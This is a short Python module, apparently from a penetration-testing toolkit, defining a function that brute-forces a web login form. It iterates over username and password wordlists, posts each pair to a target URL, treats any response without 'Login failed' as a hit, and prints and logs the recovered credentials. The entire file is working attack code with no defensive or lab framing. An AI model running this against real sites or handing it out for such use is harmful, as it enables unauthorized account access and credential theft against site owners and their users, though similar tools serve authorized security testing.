import requests
from utils import load_wordlist, get_timestamped_filename

def brute_force_login(url, username_file="../resources/usernames.txt", password_file="../resources/passwords.txt"):
    usernames = load_wordlist(username_file)
    passwords = load_wordlist(password_file)
    output_file = get_timestamped_filename("../results/login_bruteforce_results")

    with open(output_file, "w") as log_file:
        print("[+] Starting brute-force login attempts...")
        for username in usernames:
            for password in passwords:
                login_data = {'username': username, 'password': password, 'submit': 'login'}
                try:
                    response = requests.post(url, data=login_data, timeout=5)
                    if 'Login failed' not in response.text:
                        print(f"[+] Login successful: {username} / {password}")
                        log_file.write(f"{username} / {password}\n")
                        return  # Stop after first successful login
                except requests.RequestException:
                    print(f"[!] Connection error for {username}:{password}")

    print(f"\n[+] Brute-force login complete. Results saved to {output_file}")
